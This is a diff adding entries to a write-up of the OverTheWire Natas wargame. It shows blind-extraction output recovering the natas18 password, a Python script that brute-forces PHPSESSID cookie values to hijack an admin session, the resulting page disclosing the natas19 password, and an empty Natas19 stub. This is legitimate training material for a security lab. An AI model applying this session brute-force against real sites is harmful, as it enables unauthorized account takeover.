@@ -966,7 +966,38 @@ for i in range(1,70):
 **Output**
 
 ```html
-
+x
+xv
+xvK
+xvKI
+xvKIq
+xvKIqD
+xvKIqDj
+xvKIqDjy
+xvKIqDjy4
+xvKIqDjy4O
+xvKIqDjy4OP
+xvKIqDjy4OPv
+xvKIqDjy4OPv7
+xvKIqDjy4OPv7w
+xvKIqDjy4OPv7wC
+xvKIqDjy4OPv7wCR
+xvKIqDjy4OPv7wCRg
+xvKIqDjy4OPv7wCRgD
+xvKIqDjy4OPv7wCRgDl
+xvKIqDjy4OPv7wCRgDlm
+xvKIqDjy4OPv7wCRgDlmj
+xvKIqDjy4OPv7wCRgDlmj0
+xvKIqDjy4OPv7wCRgDlmj0p
+xvKIqDjy4OPv7wCRgDlmj0pF
+xvKIqDjy4OPv7wCRgDlmj0pFs
+xvKIqDjy4OPv7wCRgDlmj0pFsC
+xvKIqDjy4OPv7wCRgDlmj0pFsCs
+xvKIqDjy4OPv7wCRgDlmj0pFsCsD
+xvKIqDjy4OPv7wCRgDlmj0pFsCsDj
+xvKIqDjy4OPv7wCRgDlmj0pFsCsDjh
+xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhd
+xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
 ```
 
 ## Natas18
@@ -979,13 +1010,59 @@ https://overthewire.org/wargames/natas/natas17.html
 > URL:      http://natas18.natas.labs.overthewire.org
 
 ```python
+import natasX
+
+natas = natasX
+
+#print(natas.natasX(18, "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP", endpoint="index.php", data={"debug": "", "username": "natas19", "password": ""}))
+
+for i in range(1, 640):
+    print(natas.natasX(18, "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP", endpoint="index.php", data={"debug": "", "username": "admin", "password": ""}, cookies={"PHPSESSID": f'{i}'}).text)
 ```
 
 **Output**
 
 ```html
+
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas18", "pass": "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP" };</script></head>
+<body>
+<h1>natas18</h1>
+<div id="content">
+DEBUG: Session start ok<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas19
+Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs</pre><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
 ```
 
+
+## Natas19
+https://overthewire.org/wargames/natas/natas17.html
+
+> Natas Level 18 → Level 19
+
+> Username: natas19
+
+> URL:      http://natas19.natas.labs.overthewire.org
+
+```python
+
+```
+
+**Output**
+
+```html
+
+```
 
 <br>
 
